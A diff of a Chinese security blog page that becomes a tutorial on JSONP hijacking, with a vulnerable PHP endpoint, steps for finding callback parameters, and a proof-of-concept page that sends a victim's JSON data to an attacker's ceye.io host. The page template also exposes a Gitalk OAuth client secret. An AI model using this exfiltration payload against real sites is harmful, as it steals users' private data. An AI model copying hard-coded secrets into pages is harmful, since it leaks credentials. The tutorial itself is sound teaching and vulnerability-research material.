@@ -3,16 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Archives: 2020/5 | Twe1ve&#39;s Blog</title>
+  <title>jsonp劫持 | Twe1ve&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Twe1ve&#39;s Blog">
-<meta property="og:url" content="https://github.com/archives/2020/05/index.html">
+  <meta name="description" content="JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。 [同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息 JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 pos">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jsonp劫持">
+<meta property="og:url" content="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/index.html">
 <meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。 [同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息 JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 pos">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/1.png">
+<meta property="og:image" content="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/2.png">
+<meta property="og:image" content="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/3.png">
+<meta property="article:published_time" content="2020-05-24T02:42:15.000Z">
+<meta property="article:modified_time" content="2020-05-24T02:46:05.940Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/1.png">
   
     <link rel="icon" href="/images/icon.png">
   
@@ -113,60 +121,111 @@
       </div>
     </div>
     <!--主页上右部分-->
-    <section class="archive main-right flex1">
-  
-  
-    <section class="archive-category">
-      <h1 class="title">2020</h1>
-      <ul class="menu">
-        
-          <li>
-            <a href="/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/">jsonp劫持</a>
-            <span class="date">May 24, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">PHP反序列化漏洞学习</a>
-            <span class="date">May 24, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">文件上传漏洞学习</a>
-            <span class="date">May 24, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/21/HSTS-bypassing/">HSTS bypassing</a>
-            <span class="date">May 21, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">某面试做题记录</a>
-            <span class="date">May 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/">二次注入详解</a>
-            <span class="date">May 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/19/SSRF-Redis/">SSRF+Redis</a>
-            <span class="date">May 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/">域渗透之隐藏管理员用户和派生本地管理员</a>
-            <span class="date">May 1, 2020</span>
-          </li>
-        
-      </ul>
-    </section>
-  
-</section>
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">jsonp劫持</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· May 24, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p>JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。</p>
+<p>[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息</p>
+<p>JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),<strong>它利用的是 script 标签的 src 属性不受同源策略影响的特性，</strong></p>
+<p>JSONP(JSON with Padding)是JSON的一种“使用模式”</p>
+<p>jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）</p>
+<p><a href="https://www.cnblogs.com/xiaozi/p/9963523.html" target="_blank" rel="noopener">漏洞源码 </a></p>
+<p>getUser.php</p>
+<pre><code>&lt;?php
+header(&apos;Content-type: application/json&apos;);
+$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名
+//json数据
+//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;
+$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;
+echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据
+?&gt;</code></pre><p>客户端实现 callbackFunction 函数</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;JSONP劫持测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function callbackFunction(result)
+    {
+        alert(result.name);
+    }
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h2 id="jsonp漏洞挖掘："><a href="#jsonp漏洞挖掘：" class="headerlink" title="jsonp漏洞挖掘："></a>jsonp漏洞挖掘：</h2><p>首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。</p>
+<p><img src="1.png" alt=""></p>
+<p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email</p>
+<p>一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）</p>
+<p><img src="2.png" alt=""></p>
+<p>callback函数可控，测试跨域劫持。poc：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+function jsonpjack(json){
+new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)
+}
+&lt;/script&gt;
+&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>ceye返回结果：</p>
+<p><img src="3.png" alt=""></p>
+<p><a href="https://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126347.html</a></p>
+<p><a href="https://securitycafe.ro/2017/01/18/practical-jsonp-injection/" target="_blank" rel="noopener">https://securitycafe.ro/2017/01/18/practical-jsonp-injection/</a></p>
 
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
 
-
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
   </div>
   <!--
   <div class="main-bottom">
